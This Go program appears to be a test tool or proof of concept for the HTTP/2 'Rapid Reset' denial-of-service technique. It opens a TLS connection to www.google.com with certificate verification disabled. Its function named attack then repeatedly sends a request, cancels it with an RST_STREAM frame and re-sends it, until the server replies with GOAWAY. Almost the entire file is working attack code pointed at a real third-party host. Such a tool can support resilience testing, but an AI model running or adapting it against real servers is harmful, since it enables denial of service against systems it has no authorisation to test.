package main

import (
	"bytes"
	"crypto/tls"
	"log"
	"net/url"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
	var headerBlock bytes.Buffer

	// Encode headers
	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: url.Path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: url.Host})

	return http2.HeadersFrameParam{
		StreamID:      streamId,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}
}

func main() {
	serverUrl, err := url.Parse("https://www.google.com:443/")
	if err != nil {
		log.Fatalf("invalid server url: %v", err)
	}

	connections := 1
	skipVerify := true

	conf := &tls.Config{
		InsecureSkipVerify: skipVerify,
		NextProtos:         []string{"h2"},
	}

	for i := 0; i < connections; i++ {
		conn, err := tls.Dial("tcp", serverUrl.Host, conf)
		if err != nil {
			log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
		}

		log.Printf("established connection to %v", serverUrl)

		prefaceBytes := []byte(PREFACE)
		length, err := conn.Write(prefaceBytes)
		if err != nil || length != len(prefaceBytes) {
			log.Fatalf("error sending HTTP2 preface data. Sent %d bytes of %d: %v", length, len(prefaceBytes), err)
		}
		log.Printf("wrote HTTP2 preface")

		framer := http2.NewFramer(conn, conn)
		err = framer.WriteSettings()
		if err != nil {
			log.Fatalf("failed writing SETTINGS frame: %v (%v)", err, framer.ErrorDetail())
		}

		for {
			frame, err := framer.ReadFrame()
			if err != nil {
				log.Fatalf("failed reading frame: %v (%v)", err, framer.ErrorDetail())
			}

			if frame.Header().Type == http2.FrameSettings && frame.Header().Flags == http2.FlagSettingsAck {
				log.Println("received server SETTINGS ACK frame, continuing...")
				break
			}

			log.Printf("received unexpected frame: %v (Flags: %d). Expected SETTINGS ACK.", frame.Header().Type, frame.Header().Flags)
		}

		//at this point, the connection is established.

		attack(framer, serverUrl)
		conn.Close()
	}
}

const streamId uint32 = 1

func attack(framer *http2.Framer, url *url.URL) {
	framer.WriteHeaders(createHeaderFrameParam(url, streamId))
	for {
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Fatalf("error reading response frame: %v", err)
		}
		log.Printf("found new frame headers: %v", frame.Header())

		if frame.Header().Type == http2.FrameHeaders {
			log.Println("received HEADERS, now sending RST Frame...")
			err = framer.WriteRSTStream(streamId, http2.ErrCodeCancel)
			if err != nil {
				log.Fatalf("failed sending RST STREAM frame: %v", err)
			}

			log.Println("wrote RST STREAM frame")
			err = framer.WriteHeaders(createHeaderFrameParam(url, streamId))
			if err != nil {
				log.Fatalf("error sending new HEADERS frame: %v", err)
			}

			log.Println("wrote new HEADERS frame to start a new request...")
		} else if frame.Header().Type == http2.FrameGoAway {
			log.Printf("received GOAWAY. It seems like the server responded correctly.")
			break
		}
	}
}
